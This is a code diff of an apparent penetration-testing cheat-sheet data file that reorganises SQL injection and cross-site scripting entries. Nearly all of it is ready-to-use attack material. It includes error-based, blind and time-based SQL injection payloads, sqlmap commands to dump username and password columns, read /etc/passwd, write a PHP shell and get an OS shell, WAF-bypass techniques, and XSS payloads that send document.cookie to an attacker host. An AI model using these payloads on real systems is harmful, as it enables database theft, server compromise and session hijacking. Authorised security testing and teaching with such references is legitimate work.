-        name: 'SQLi — Error-Based Injection',
-        description: 'Force the database to embed query results inside error messages, visible in the HTTP response.',
-        tags: ['web', 'sqli'],
-                subtechniques: [
-          {
-            id: "sqe-mysql",
-            name: "MySQL",
-            commands: [
-            { id: "sqe1", label: "MySQL — extractvalue", os: "Both", command: "' AND extractvalue(1,concat(0x7e,(SELECT version())))-- -\n' AND extractvalue(1,concat(0x7e,(SELECT database())))-- -\n' AND extractvalue(1,concat(0x7e,(SELECT $$DB_COLUMN FROM $$DB_TABLE LIMIT 1)))-- -", notes: "Output appears in the XPATH error: ~<value>. Limit = 31 chars per call." },
-            { id: "sqe2", label: "MySQL — updatexml", os: "Both", command: "' AND updatexml(1,concat(0x7e,(SELECT version())),1)-- -\n' AND updatexml(1,concat(0x7e,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database())),1)-- -\n' AND updatexml(1,concat(0x7e,(SELECT group_concat($$DB_COLUMN) FROM $$DB_TABLE)),1)-- -", notes: "Same 31-char limit. Use group_concat to squeeze multiple values." },
-            { id: "sqe3", label: "MySQL — floor/rand", os: "Both", command: "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT database()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -", notes: "Triggers \"Duplicate entry\" error. Works on older MySQL where extractvalue is unavailable." }
+            { id: 'sqe1', label: 'MySQL — extractvalue', os: 'Both', command: "' AND extractvalue(1,concat(0x7e,(SELECT version())))-- -\n' AND extractvalue(1,concat(0x7e,(SELECT database())))-- -\n' AND extractvalue(1,concat(0x7e,(SELECT $$DB_COLUMN FROM $$DB_TABLE LIMIT 1)))-- -", notes: 'Data appears in XPATH error: ~<value>. Max 31 chars per call.' },
+            { id: 'sqe2', label: 'MySQL — updatexml', os: 'Both', command: "' AND updatexml(1,concat(0x7e,(SELECT version())),1)-- -\n' AND updatexml(1,concat(0x7e,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database())),1)-- -\n' AND updatexml(1,concat(0x7e,(SELECT group_concat($$DB_COLUMN) FROM $$DB_TABLE)),1)-- -", notes: 'Same 31-char limit. Use group_concat to squeeze multiple values.' },
+            { id: 'sqe3', label: 'MySQL — floor/rand', os: 'Both', command: "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT database()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -", notes: 'Triggers "Duplicate entry" error. Works on older MySQL.' },
+            { id: 'sqe4', label: 'MSSQL — convert/cast', os: 'Both', command: "' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysobjects WHERE xtype='U'))-- -\n' AND 1=CONVERT(int,(SELECT TOP 1 $$DB_COLUMN FROM $$DB_TABLE))-- -\n' AND 1=CAST((SELECT TOP 1 name FROM master..sysdatabases) AS int)-- -", notes: '"Conversion failed when converting the varchar value..." — data visible in error message.' },
+            { id: 'sqe5', label: 'MSSQL — HAVING / GROUP BY', os: 'Both', command: "' HAVING 1=1-- -\n' GROUP BY columnname HAVING 1=1-- -", notes: 'Reveals current table column names in error messages.' },
+            { id: 'sqe6', label: 'PostgreSQL — cast error', os: 'Both', command: "' AND CAST((SELECT version()) AS int)-- -\n' AND CAST((SELECT $$DB_COLUMN FROM $$DB_TABLE LIMIT 1) AS int)-- -", notes: '"invalid input syntax for type integer: <value>" — data in error.' },
             ]
           },
           {
-            id: "sqe-mssql",
-            name: "MSSQL & PostgreSQL",
+            id: 'sqli-blind-bool',
+            name: 'Boolean Blind',
             commands: [
-            { id: "sqe4", label: "MSSQL — convert/cast", os: "Both", command: "' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysobjects WHERE xtype='U'))-- -\n' AND 1=CONVERT(int,(SELECT TOP 1 $$DB_COLUMN FROM $$DB_TABLE))-- -\n' AND 1=CAST((SELECT TOP 1 name FROM master..sysdatabases) AS int)-- -", notes: "\"Conversion failed when converting the varchar value...\" — data visible in error message." },
-            { id: "sqe5", label: "MSSQL — HAVING / GROUP BY", os: "Both", command: "' HAVING 1=1-- -\n' GROUP BY columnname HAVING 1=1-- -", notes: "Reveals current table column names in error messages when the query uses GROUP BY." },
-            { id: "sqe6", label: "PostgreSQL — cast error", os: "Both", command: "' AND CAST((SELECT version()) AS int)-- -\n' AND CAST((SELECT $$DB_COLUMN FROM $$DB_TABLE LIMIT 1) AS int)-- -", notes: "\"invalid input syntax for type integer: <value>\" — data in error." }
-            ]
-          }
-        ],
-      },
-      {
-        id: 'web-sqli-blind-bool',
-        name: 'SQLi — Boolean Blind',
-        description: 'Extract data one bit/character at a time by observing TRUE vs FALSE page differences.',
-        tags: ['web', 'sqli'],
-        commands: [
-          { id: 'sqbb1', label: 'Confirm boolean control', os: 'Both', command: "' AND 1=1-- -\n' AND 1=2-- -", notes: 'Response MUST differ. If both look the same, use time-based blind instead.' },
-          { id: 'sqbb2', label: 'Extract DB name (char by char)', os: 'Both', command: "' AND SUBSTRING(database(),1,1)='a'-- -\n' AND SUBSTRING(database(),1,1)='b'-- -\n' AND ASCII(SUBSTRING(database(),1,1))>64-- -\n' AND ASCII(SUBSTRING(database(),1,1))>96-- -", notes: 'Binary search on ASCII value is much faster than iterating a-z. Automate with Burp Intruder.' },
-          { id: 'sqbb3', label: 'Extract table name (char by char)', os: 'Both', command: "' AND ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1),1,1))>64-- -", notes: 'Change LIMIT offset to iterate through tables.' },
-          { id: 'sqbb4', label: 'Extract column data (char by char)', os: 'Both', command: "' AND ASCII(SUBSTRING((SELECT $$DB_COLUMN FROM $$DB_TABLE LIMIT 1 OFFSET 0),1,1))>64-- -", notes: 'Change OFFSET to iterate through rows. Change position index for each character.' },
-          { id: 'sqbb5', label: 'MSSQL substring', os: 'Both', command: "' AND SUBSTRING((SELECT TOP 1 name FROM sysobjects WHERE xtype='U'),1,1)='u'-- -\n' AND ASCII(SUBSTRING((SELECT TOP 1 $$DB_COLUMN FROM $$DB_TABLE),1,1))>64-- -", notes: 'MSSQL uses TOP 1 instead of LIMIT 1.' },
-          { id: 'sqbb6', label: 'Automate with sqlmap (boolean)', os: 'Linux', command: "sqlmap -u '$$VULN_URL' -p $$VULN_PARAM --technique=B --level 3 --batch", notes: '--technique=B forces boolean-only. Slower but stealthier.' },
-        ],
-      },
-      {
-        id: 'web-sqli-blind-time',
-        name: 'SQLi — Time-Based Blind',
-        description: 'Extract data via deliberate response delays when there is no visible output or boolean difference.',
-        tags: ['web', 'sqli'],
-        commands: [
-          { id: 'sqbt1', label: 'Baseline delay confirm', os: 'Both', command: "' AND SLEEP(5)-- -\n'; WAITFOR DELAY '0:0:5'-- -\n'; SELECT pg_sleep(5)-- -\n' AND 1=1 AND SLEEP(1)-- -", notes: 'MySQL = SLEEP(). MSSQL = WAITFOR DELAY. PostgreSQL = pg_sleep(). Confirm before extracting.' },
-          { id: 'sqbt2', label: 'Conditional delay (MySQL)', os: 'Both', command: "' AND IF(1=1,SLEEP(5),0)-- -\n' AND IF(database()='$$DB_NAME',SLEEP(5),0)-- -\n' AND IF(ASCII(SUBSTRING(database(),1,1))>96,SLEEP(3),0)-- -", notes: 'Delay only fires on TRUE condition — confirms each character.' },
-          { id: 'sqbt3', label: 'Conditional delay (MSSQL)', os: 'Both', command: "'; IF (1=1) WAITFOR DELAY '0:0:5'-- -\n'; IF (DB_NAME()='$$DB_NAME') WAITFOR DELAY '0:0:5'-- -\n'; IF (ASCII(SUBSTRING((SELECT TOP 1 name FROM sysobjects WHERE xtype='U'),1,1))>90) WAITFOR DELAY '0:0:3'-- -", notes: 'MSSQL stacked query for time control.' },
-          { id: 'sqbt4', label: 'Conditional delay (PostgreSQL)', os: 'Both', command: "'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END-- -\n'; SELECT CASE WHEN (current_database()='$$DB_NAME') THEN pg_sleep(5) ELSE pg_sleep(0) END-- -", notes: 'PostgreSQL CASE WHEN for conditional sleep.' },
-          { id: 'sqbt5', label: 'Extract DB name via time', os: 'Both', command: "' AND IF(ASCII(SUBSTRING(database(),1,1))=97,SLEEP(3),0)-- -\n' AND IF(ASCII(SUBSTRING(database(),2,1))=100,SLEEP(3),0)-- -", notes: 'ASCII 97=a, 98=b, etc. Iterate position and value — automate with Burp Intruder or sqlmap.' },
-          { id: 'sqbt6', label: 'Automate with sqlmap (time)', os: 'Linux', command: "sqlmap -u '$$VULN_URL' -p $$VULN_PARAM --technique=T --time-sec=3 --level 3 --batch", notes: '--technique=T forces time-based only. Increase --time-sec on slow connections.' },
-        ],
-      },
-      {
-        id: 'web-sqli-sqlmap-enum',
-        name: 'SQLi — sqlmap Enumeration',
-        description: 'Use sqlmap to automatically discover injection points and enumerate the database structure.',
-        tags: ['web', 'sqli'],
-                subtechniques: [
-          {
-            id: "sqme-req",
-            name: "Request Setup",
-            commands: [
-            { id: "sqme1", label: "GET parameter", os: "Linux", command: "sqlmap -u '$$VULN_URL' --dbs --batch", notes: "Automatically detects and tests the GET parameters in the URL." },
-            { id: "sqme2", label: "POST parameter", os: "Linux", command: "sqlmap -u 'http://$$IP/login' --data='user=admin&pass=test' -p $$VULN_PARAM --dbs --batch", notes: "-p specifies which POST param to test." },
-            { id: "sqme3", label: "Cookie parameter", os: "Linux", command: "sqlmap -u 'http://$$IP/' --cookie='id=1; session=abc' -p id --dbs --batch", notes: "Test injectable values in cookies." },
-            { id: "sqme4", label: "From Burp request file", os: "Linux", command: "sqlmap -r request.txt --dbs --batch", notes: "Save raw HTTP request from Burp (right-click → Save item). Most reliable method." },
-            { id: "sqme5", label: "JSON body", os: "Linux", command: "sqlmap -u 'http://$$IP/api/items' --data='{\"id\":1}' --batch", notes: "sqlmap auto-detects JSON format. Use with API endpoints." }
+            { id: 'sqbb1', label: 'Confirm boolean control', os: 'Both', command: "' AND 1=1-- -\n' AND 1=2-- -", notes: 'Response MUST differ. If both look the same, use time-based blind instead.' },
+            { id: 'sqbb2', label: 'Extract DB name (char by char)', os: 'Both', command: "' AND SUBSTRING(database(),1,1)='a'-- -\n' AND ASCII(SUBSTRING(database(),1,1))>64-- -\n' AND ASCII(SUBSTRING(database(),1,1))>96-- -", notes: 'Binary search on ASCII value is faster than iterating a-z. Automate with Burp Intruder.' },
+            { id: 'sqbb3', label: 'Extract table name', os: 'Both', command: "' AND ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1),1,1))>64-- -", notes: 'Change LIMIT offset to iterate through tables.' },
+            { id: 'sqbb4', label: 'Extract column data', os: 'Both', command: "' AND ASCII(SUBSTRING((SELECT $$DB_COLUMN FROM $$DB_TABLE LIMIT 1 OFFSET 0),1,1))>64-- -", notes: 'Change OFFSET to iterate rows. Change position index for each character.' },
+            { id: 'sqbb5', label: 'MSSQL substring', os: 'Both', command: "' AND SUBSTRING((SELECT TOP 1 name FROM sysobjects WHERE xtype='U'),1,1)='u'-- -\n' AND ASCII(SUBSTRING((SELECT TOP 1 $$DB_COLUMN FROM $$DB_TABLE),1,1))>64-- -", notes: 'MSSQL uses TOP 1 instead of LIMIT 1.' },
+            { id: 'sqbb6', label: 'sqlmap (boolean only)', os: 'Linux', command: "sqlmap -u '$$VULN_URL' -p $$VULN_PARAM --technique=B --level 3 --batch", notes: '--technique=B forces boolean-only. Slower but stealthier.' },
             ]
           },
           {
-            id: "sqme-enum",
-            name: "Enumeration",
+            id: 'sqli-blind-time',
+            name: 'Time-Based Blind',
             commands: [
-            { id: "sqme6", label: "Full enumeration (user, db, tables)", os: "Linux", command: "sqlmap -u '$$VULN_URL' --current-user --current-db --hostname --dbs --batch", notes: "Single command for full initial recon." },
-            { id: "sqme7", label: "List tables in DB", os: "Linux", command: "sqlmap -u '$$VULN_URL' -D $$DB_NAME --tables --batch", notes: "" },
-            { id: "sqme8", label: "List columns in table", os: "Linux", command: "sqlmap -u '$$VULN_URL' -D $$DB_NAME -T $$DB_TABLE --columns --batch", notes: "" },
-            { id: "sqme9", label: "Increase aggressiveness", os: "Linux", command: "sqlmap -u '$$VULN_URL' --level 5 --risk 3 --dbs --batch", notes: "--level 5 tests all parameters including headers/cookies. --risk 3 enables heavy payloads." }
-            ]
-          }
-        ],
-      },
-      {
-        id: 'web-sqli-sqlmap-exploit',
-        name: 'SQLi — sqlmap Data Extraction',
-        description: 'Dump tables, read/write files, and escalate to OS command execution via sqlmap.',
-        tags: ['web', 'sqli'],
-                subtechniques: [
-          {
-            id: "sqmx-data",
-            name: "Data Extraction",
-            commands: [
-            { id: "sqmx1", label: "Dump specific table", os: "Linux", command: "sqlmap -u '$$VULN_URL' -D $$DB_NAME -T $$DB_TABLE --dump --batch", notes: "" },
-            { id: "sqmx2", label: "Dump specific columns", os: "Linux", command: "sqlmap -u '$$VULN_URL' -D $$DB_NAME -T $$DB_TABLE -C \"username,password\" --dump --batch", notes: "Faster — avoids downloading every column." },
-            { id: "sqmx3", label: "Dump all tables in DB", os: "Linux", command: "sqlmap -u '$$VULN_URL' -D $$DB_NAME --dump-all --batch", notes: "" },
-            { id: "sqmx4", label: "Crack hashes after dump", os: "Linux", command: "sqlmap -u '$$VULN_URL' -D $$DB_NAME -T $$DB_TABLE -C \"username,password\" --dump --passwords --batch", notes: "--passwords also dumps DB auth hashes and attempts to crack them." }
+            { id: 'sqbt1', label: 'Baseline delay confirm', os: 'Both', command: "' AND SLEEP(5)-- -\n'; WAITFOR DELAY '0:0:5'-- -\n'; SELECT pg_sleep(5)-- -", notes: 'MySQL = SLEEP(). MSSQL = WAITFOR DELAY. PostgreSQL = pg_sleep(). Confirm before extracting.' },
+            { id: 'sqbt2', label: 'Conditional delay (MySQL)', os: 'Both', command: "' AND IF(1=1,SLEEP(5),0)-- -\n' AND IF(database()='$$DB_NAME',SLEEP(5),0)-- -\n' AND IF(ASCII(SUBSTRING(database(),1,1))>96,SLEEP(3),0)-- -", notes: 'Delay fires only on TRUE condition — confirms each character.' },
+            { id: 'sqbt3', label: 'Conditional delay (MSSQL)', os: 'Both', command: "'; IF (1=1) WAITFOR DELAY '0:0:5'-- -\n'; IF (DB_NAME()='$$DB_NAME') WAITFOR DELAY '0:0:5'-- -\n'; IF (ASCII(SUBSTRING((SELECT TOP 1 name FROM sysobjects WHERE xtype='U'),1,1))>90) WAITFOR DELAY '0:0:3'-- -", notes: 'MSSQL stacked query for time control.' },
+            { id: 'sqbt4', label: 'Conditional delay (PostgreSQL)', os: 'Both', command: "'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END-- -\n'; SELECT CASE WHEN (current_database()='$$DB_NAME') THEN pg_sleep(5) ELSE pg_sleep(0) END-- -", notes: 'PostgreSQL CASE WHEN for conditional sleep.' },
+            { id: 'sqbt5', label: 'Extract DB name via time', os: 'Both', command: "' AND IF(ASCII(SUBSTRING(database(),1,1))=97,SLEEP(3),0)-- -\n' AND IF(ASCII(SUBSTRING(database(),2,1))=100,SLEEP(3),0)-- -", notes: 'ASCII 97=a, 98=b etc. Iterate position and value — automate with Burp Intruder or sqlmap.' },
+            { id: 'sqbt6', label: 'sqlmap (time-based only)', os: 'Linux', command: "sqlmap -u '$$VULN_URL' -p $$VULN_PARAM --technique=T --time-sec=3 --level 3 --batch", notes: '--technique=T forces time-based only. Increase --time-sec on slow connections.' },
             ]
           },
           {
-            id: "sqmx-shell",
-            name: "File & Shell",
+            id: 'sqli-sqlmap',
+            name: 'sqlmap',
             commands: [
-            { id: "sqmx5", label: "Read file from server", os: "Linux", command: "sqlmap -u '$$VULN_URL' --file-read='/etc/passwd' --batch\nsqlmap -u '$$VULN_URL' --file-read='C:\\\\Windows\\\\System32\\\\drivers\\\\etc\\\\hosts' --batch", notes: "Requires FILE privilege (MySQL) or BULK INSERT rights (MSSQL)." },
-            { id: "sqmx6", label: "Write file to server", os: "Linux", command: "sqlmap -u '$$VULN_URL' --file-write='./shell.php' --file-dest='/var/www/html/shell.php' --batch", notes: "Requires FILE privilege and write permission on target directory." },
-            { id: "sqmx7", label: "Interactive SQL shell", os: "Linux", command: "sqlmap -u '$$VULN_URL' --sql-shell --batch", notes: "Interactive SQL prompt through the injection. Useful for manual queries." },
-            { id: "sqmx8", label: "OS command execution", os: "Linux", command: "sqlmap -u '$$VULN_URL' --os-cmd='id' --batch\nsqlmap -u '$$VULN_URL' --os-shell --batch", notes: "--os-cmd for single command, --os-shell for interactive shell. Uses xp_cmdshell (MSSQL) or UDF (MySQL)." }
-            ]
-          }
-        ],
-      },
-      {
-        id: 'web-sqli-waf',
-        name: 'SQLi — WAF & Filter Bypass',
-        description: 'Techniques to evade web application firewalls, input filters, and blacklists.',
-        tags: ['web', 'sqli'],
-                subtechniques: [
-          {
-            id: "sqw-man",
-            name: "Manual Bypass",
-            commands: [
-            { id: "sqw1", label: "Case variation", os: "Both", command: "SeLeCt\nunIOn sElEcT\nSELECT/**/1,2,3\nsElEcT 1,2,3", notes: "Many WAFs use case-sensitive matching. Mixed case bypasses simple keyword filters." },
-            { id: "sqw2", label: "Comment injection", os: "Both", command: "SE/**/LECT\nUN/**/ION SE/**/LECT\n' UN/*comment*/ION SE/*comment*/LECT 1,2-- -\n' /*!UNION*/ /*!SELECT*/ 1,2-- -", notes: "/**/ breaks keywords for string-matching WAFs. /*!...*/ = MySQL version comment (still executes)." },
-            { id: "sqw3", label: "URL / double encoding", os: "Both", command: "%27 = '\n%20 = space\n%23 = #\n%2527 = double-encoded '\n' %55NION %53ELECT-- -", notes: "Try URL encoding the entire payload or just special chars. Double-encoding bypasses single-decode WAFs." },
-            { id: "sqw4", label: "Whitespace alternatives", os: "Both", command: "'%09UNION%09SELECT-- -\n'%0aUNION%0aSELECT-- -\n'%0dUNION%0dSELECT-- -\n' UNION(SELECT(1),(2),(3))-- -", notes: "%09=tab, %0a=newline, %0d=carriage return. Parentheses also eliminate spaces." },
-            { id: "sqw5", label: "Alternate comment terminators", os: "Both", command: "-- -\n-- comment\n#\n--+\n;%00\n'/*", notes: "Some WAFs block -- but allow #. --+ URL-decoded = -- . Try all if one is blocked." }
+            { id: 'sqme1', label: 'GET parameter', os: 'Linux', command: "sqlmap -u '$$VULN_URL' --dbs --batch", notes: 'Automatically detects and tests GET parameters in the URL.' },
+            { id: 'sqme2', label: 'POST parameter', os: 'Linux', command: "sqlmap -u '$$URL/login' --data='user=admin&pass=test' -p $$VULN_PARAM --dbs --batch", notes: '-p specifies which POST param to test.' },
+            { id: 'sqme3', label: 'Cookie parameter', os: 'Linux', command: "sqlmap -u '$$URL/' --cookie='id=1; session=abc' -p id --dbs --batch", notes: 'Test injectable values in cookies.' },
+            { id: 'sqme4', label: 'From Burp request file', os: 'Linux', command: "sqlmap -r request.txt --dbs --batch", notes: 'Save raw HTTP request from Burp (right-click → Save item). Most reliable method.' },
+            { id: 'sqme5', label: 'JSON body', os: 'Linux', command: "sqlmap -u '$$URL/api/items' --data='{\"id\":1}' --batch", notes: 'sqlmap auto-detects JSON format. Use with API endpoints.' },
+            { id: 'sqme6', label: 'Full initial recon', os: 'Linux', command: "sqlmap -u '$$VULN_URL' --current-user --current-db --hostname --dbs --batch", notes: 'Single command for full initial DB recon.' },
+            { id: 'sqme7', label: 'List tables in DB', os: 'Linux', command: "sqlmap -u '$$VULN_URL' -D $$DB_NAME --tables --batch", notes: '' },
+            { id: 'sqme8', label: 'List columns in table', os: 'Linux', command: "sqlmap -u '$$VULN_URL' -D $$DB_NAME -T $$DB_TABLE --columns --batch", notes: '' },
+            { id: 'sqme9', label: 'Increase aggressiveness', os: 'Linux', command: "sqlmap -u '$$VULN_URL' --level 5 --risk 3 --dbs --batch", notes: '--level 5 tests all params including headers/cookies. --risk 3 enables heavy payloads.' },
+            { id: 'sqmx1', label: 'Dump specific table', os: 'Linux', command: "sqlmap -u '$$VULN_URL' -D $$DB_NAME -T $$DB_TABLE --dump --batch", notes: '' },
+            { id: 'sqmx2', label: 'Dump specific columns', os: 'Linux', command: "sqlmap -u '$$VULN_URL' -D $$DB_NAME -T $$DB_TABLE -C \"username,password\" --dump --batch", notes: 'Faster — avoids downloading every column.' },
+            { id: 'sqmx4', label: 'Crack hashes after dump', os: 'Linux', command: "sqlmap -u '$$VULN_URL' -D $$DB_NAME -T $$DB_TABLE -C \"username,password\" --dump --passwords --batch", notes: '--passwords also dumps DB auth hashes and attempts to crack them.' },
+            { id: 'sqmx5', label: 'Read file from server', os: 'Linux', command: "sqlmap -u '$$VULN_URL' --file-read='/etc/passwd' --batch\nsqlmap -u '$$VULN_URL' --file-read='C:\\\\Windows\\\\System32\\\\drivers\\\\etc\\\\hosts' --batch", notes: 'Requires FILE privilege (MySQL) or BULK INSERT rights (MSSQL).' },
+            { id: 'sqmx6', label: 'Write file to server', os: 'Linux', command: "sqlmap -u '$$VULN_URL' --file-write='./shell.php' --file-dest='/var/www/html/shell.php' --batch", notes: 'Requires FILE privilege and write permission on the target directory.' },
+            { id: 'sqmx7', label: 'Interactive SQL shell', os: 'Linux', command: "sqlmap -u '$$VULN_URL' --sql-shell --batch", notes: 'Interactive SQL prompt through the injection. Useful for manual queries.' },
+            { id: 'sqmx8', label: 'OS command execution', os: 'Linux', command: "sqlmap -u '$$VULN_URL' --os-cmd='id' --batch\nsqlmap -u '$$VULN_URL' --os-shell --batch", notes: '--os-cmd for single command, --os-shell for interactive. Uses xp_cmdshell (MSSQL) or UDF (MySQL).' },
             ]
           },
           {
-            id: "sqw-tool",
-            name: "sqlmap WAF",
+            id: 'sqli-waf',
+            name: 'WAF & Filter Bypass',
             commands: [
-            { id: "sqw6", label: "sqlmap tamper scripts", os: "Linux", command: "sqlmap -u '$$VULN_URL' --tamper=space2comment --batch\nsqlmap -u '$$VULN_URL' --tamper=between,space2comment,randomcase --batch\nsqlmap -u '$$VULN_URL' --tamper=charunicodeencode --batch\nsqlmap -u '$$VULN_URL' --tamper=apostrophemask --batch", notes: "Combine tamper scripts for layered evasion. List all: sqlmap --list-tampers" },
-            { id: "sqw7", label: "sqlmap WAF detection + bypass", os: "Linux", command: "sqlmap -u '$$VULN_URL' --identify-waf --batch\nsqlmap -u '$$VULN_URL' --level 5 --risk 3 --random-agent --delay 2 --tamper=space2comment,between --batch", notes: "--random-agent rotates User-Agent. --delay avoids rate limiting." },
-            { id: "sqw8", label: "HTTP parameter pollution", os: "Both", command: "http://$$IP/page.php?id=1&id=2\nhttp://$$IP/page.php?id=1 UNION&id= SELECT 1,2,3-- -", notes: "WAF may inspect only the first or last param; backend uses both. Split payload across duplicate params." }
+            { id: 'sqw1', label: 'Case variation', os: 'Both', command: "SeLeCt\nunIOn sElEcT\nSELECT/**/1,2,3\nsElEcT 1,2,3", notes: 'Many WAFs use case-sensitive matching. Mixed case bypasses simple keyword filters.' },
+            { id: 'sqw2', label: 'Comment injection', os: 'Both', command: "SE/**/LECT\nUN/**/ION SE/**/LECT\n' UN/*comment*/ION SE/*comment*/LECT 1,2-- -\n' /*!UNION*/ /*!SELECT*/ 1,2-- -", notes: '/**/ breaks keywords for string-matching WAFs. /*!...*/ = MySQL version comment (still executes).' },
+            { id: 'sqw3', label: 'URL / double encoding', os: 'Both', command: "%27 = '\n%20 = space\n%23 = #\n%2527 = double-encoded '\n' %55NION %53ELECT-- -", notes: 'Double-encoding bypasses single-decode WAFs.' },
+            { id: 'sqw4', label: 'Whitespace alternatives', os: 'Both', command: "'%09UNION%09SELECT-- -\n'%0aUNION%0aSELECT-- -\n'%0dUNION%0dSELECT-- -\n' UNION(SELECT(1),(2),(3))-- -", notes: '%09=tab, %0a=newline, %0d=carriage return. Parentheses also eliminate spaces.' },
+            { id: 'sqw5', label: 'Alternate comment terminators', os: 'Both', command: "-- -\n-- comment\n#\n--+\n;%00\n'/*", notes: 'Some WAFs block -- but allow #. --+ URL-decoded = -- . Try all if one is blocked.' },
+            { id: 'sqw6', label: 'sqlmap tamper scripts', os: 'Linux', command: "sqlmap -u '$$VULN_URL' --tamper=space2comment --batch\nsqlmap -u '$$VULN_URL' --tamper=between,space2comment,randomcase --batch\nsqlmap -u '$$VULN_URL' --tamper=charunicodeencode --batch", notes: 'Combine tampers for layered evasion. List all: sqlmap --list-tampers' },
+            { id: 'sqw7', label: 'sqlmap WAF detection + bypass', os: 'Linux', command: "sqlmap -u '$$VULN_URL' --identify-waf --batch\nsqlmap -u '$$VULN_URL' --level 5 --risk 3 --random-agent --delay 2 --tamper=space2comment,between --batch", notes: '--random-agent rotates User-Agent. --delay avoids rate limiting.' },
+            { id: 'sqw8', label: 'HTTP parameter pollution', os: 'Both', command: "$$URL/page.php?id=1&id=2\n$$URL/page.php?id=1 UNION&id= SELECT 1,2,3-- -", notes: 'WAF may inspect only first/last param; backend uses both. Split payload across duplicate params.' },
             ]
-          }
+          },
         ],
       },
       {
@@ -1980,20 +2170,55 @@ const TACTICS = [
                 subtechniques: [
           {
             id: "xss-det",
-            name: "Detection & Tools",
+            name: "Detection",
             commands: [
-            { id: "xss1", label: "Basic reflected test", os: "Both", command: "<script>alert(1)</script>\n\"><script>alert(1)</script>\n'><script>alert(1)</script>", notes: "Try in all input fields and URL parameters." },
-            { id: "xss2", label: "Cookie stealer payload", os: "Both", command: "<script>fetch('http://$$LHOST:$$LPORT/?c='+document.cookie)</script>", notes: "Start listener: nc -lvnp $$LPORT" },
-            { id: "xss3", label: "dalfox scan", os: "Linux", command: "dalfox url \"http://$$IP/page.php?q=test\"", notes: "Automated XSS scanner with context-aware payloads." },
-            { id: "xss4", label: "XSStrike", os: "Linux", command: "python3 XSStrike.py -u \"http://$$IP/page.php?q=test\" --crawl", notes: "Smart XSS detection with context analysis." }
+            { id: "xss1", label: "Basic probe", os: "Both", command: "<script>alert(1)</script>\n\"><script>alert(1)</script>\n'><script>alert(1)</script>\n\"><img src=x onerror=alert(1)>", notes: "Try in every input field, URL parameter, and HTTP header value." },
+            { id: "xss2", label: "Cookie exfiltration", os: "Both", command: "<script>fetch('http://$$LHOST:$$LPORT/?c='+document.cookie)</script>", notes: "Catch with: nc -lvnp $$LPORT or a Burp Collaborator URL." },
+            { id: "xss-d1", label: "dalfox scan", os: "Linux", command: "dalfox url \"$$URL/page.php?q=test\"", notes: "Context-aware XSS scanner. Also: dalfox url $$URL --crawl" },
+            { id: "xss-d2", label: "XSStrike", os: "Linux", command: "python3 XSStrike.py -u \"$$URL/page.php?q=test\" --crawl", notes: "Smart XSS detection with WAF bypass and context analysis." },
+            { id: "xss-d3", label: "BXSS (blind XSS probe)", os: "Both", command: "\"><script src=//$$LHOST/xss.js></script>", notes: "Blind XSS fires in admin panels or log viewers. Host a JS payload on $$LHOST and watch for callbacks." },
             ]
           },
           {
-            id: "xss-byp",
-            name: "Bypass & DOM",
+            id: "xss-stored",
+            name: "Stored XSS",
             commands: [
-            { id: "xss5", label: "Filter bypass payloads", os: "Both", command: "<img src=x onerror=alert(1)>\n<svg onload=alert(1)>\n<body onload=alert(1)>\njava&#115;cript:alert(1)\n<ScRiPt>alert(1)</ScRiPt>", notes: "Use when <script> tags are filtered." },
-            { id: "xss6", label: "DOM XSS sources", os: "Both", command: "document.URL\ndocument.location\ndocument.referrer\nwindow.location.hash\ndocument.cookie", notes: "Check if these flow into innerHTML / eval / document.write." }
+            { id: "xss-s1", label: "Profile/comment payload", os: "Both", command: "<script>alert(document.cookie)</script>\n<img src=x onerror=\"this.src='http://$$LHOST/?c='+document.cookie\">", notes: "Inject into persistent fields — name, bio, comment, address, user-agent. Fires for every viewer." },
+            { id: "xss-s2", label: "SVG stored", os: "Both", command: "<svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"fetch('http://$$LHOST/?c='+btoa(document.cookie))\"/>", notes: "SVG tags may be allowed when script tags are not. Use in file upload fields that render SVG inline." },
+            { id: "xss-s3", label: "HTML attribute stored", os: "Both", command: "\" onmouseover=\"alert(1)\nonclick=\"fetch('http://$$LHOST/?c='+document.cookie)", notes: "Close the attribute with \" then inject event handler. Common in name/alt/title fields." },
+            { id: "xss-s4", label: "DOM clobbering", os: "Both", command: "<a id=x href=javascript:fetch('http://$$LHOST/?c='+document.cookie)>click</a>", notes: "Overwrites window properties via HTML element IDs. Works when innerHTML is used but scripts are blocked." },
+            ]
+          },
+          {
+            id: "xss-reflected",
+            name: "Reflected & Filter Bypass",
+            commands: [
+            { id: "xss5", label: "Event handler tags", os: "Both", command: "<img src=x onerror=alert(1)>\n<svg onload=alert(1)>\n<body onload=alert(1)>\n<video src=x onerror=alert(1)>\n<details open ontoggle=alert(1)>", notes: "Use when <script> tags are blocked." },
+            { id: "xss-r1", label: "Encoded payloads", os: "Both", command: "java&#115;cript:alert(1)\n<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>\n<ScRiPt>alert(1)</ScRiPt>", notes: "HTML entity encoding and case mixing bypass simple keyword filters." },
+            { id: "xss-r2", label: "Context: inside attribute", os: "Both", command: "\" autofocus onfocus=alert(1) x=\"\n' autofocus onfocus=alert(1) x='", notes: "Close the current attribute, inject event, and open a dummy attribute to prevent parse errors." },
+            { id: "xss-r3", label: "Context: inside JS string", os: "Both", command: "';alert(1)//\n\";alert(1)//\n\\';alert(1)//", notes: "Break out of single or double quoted JavaScript string, inject code, comment remainder." },
+            { id: "xss-r4", label: "Template injection via XSS", os: "Both", command: "{{7*7}}\n${7*7}\n<%= 7*7 %>", notes: "When input is reflected into an Angular/Vue/React template. Confirms SSTI if math resolves." },
+            ]
+          },
+          {
+            id: "xss-dom",
+            name: "DOM-Based XSS",
+            commands: [
